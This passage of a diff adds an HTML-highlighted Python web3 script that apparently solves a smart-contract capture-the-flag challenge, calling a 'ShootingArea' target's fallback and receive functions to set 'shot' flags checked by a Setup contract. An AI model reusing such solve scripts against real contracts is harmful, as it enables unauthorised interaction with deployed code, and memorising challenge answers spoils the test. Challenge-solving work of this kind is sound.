+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">my_account&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_key&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PRIVATE_KEY&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Setup contract ABI&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SETUP_CONTRACT_ABI&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;nonpayable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;constructor&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;TARGET&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;contract ShootingArea&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;address&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;isSolved&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Target contract ABI&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">TARGET_CONTRACT_ABI&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;payable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;fallback&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;firstShot&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;secondShot&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;third&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;nonpayable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;thirdShot&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;payable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;receive&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Create contract instances&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">setup_contract&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">contract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">SETUP_CONTRACT_ADDRESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">abi&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">SETUP_CONTRACT_ABI&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">target_contract&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">contract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">TARGET_CONTRACT_ADDRESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">abi&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">TARGET_CONTRACT_ABI&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">print_status&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">first_shot_status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">target_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">firstShot&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">second_shot_status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">target_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">secondShot&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">third_shot_status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">target_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">thirdShot&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;First shot: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">first_shot_status&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, Second shot: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">second_shot_status&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, Third shot: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">third_shot_status&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># First shot: Call the fallback function&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;from&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;to&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">TARGET_CONTRACT_ADDRESS&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;value&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;gas&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">3000000&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;gasPrice&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_wei&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;10&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;gwei&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;nonce&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_transaction_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;data&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;0x&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;00&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Add 32 bytes of zero data to trigger the fallback function&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">signed_transaction&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">signTransaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction_hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_raw_transaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signed_transaction&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rawTransaction&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction_receipt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wait_for_transaction_receipt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction_hash&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">print_status&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Trigger the receive function to hit the second target&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;value&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_wei&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;ether&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nonce&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_transaction_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;data&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0x&amp;#39;&lt;/span> &lt;span class="c1"># Send an empty data field to trigger the receive function&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">signed_transaction&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">signTransaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction_hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_raw_transaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signed_transaction&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rawTransaction&lt;/span>&lt;span class="p">)&lt;/span>
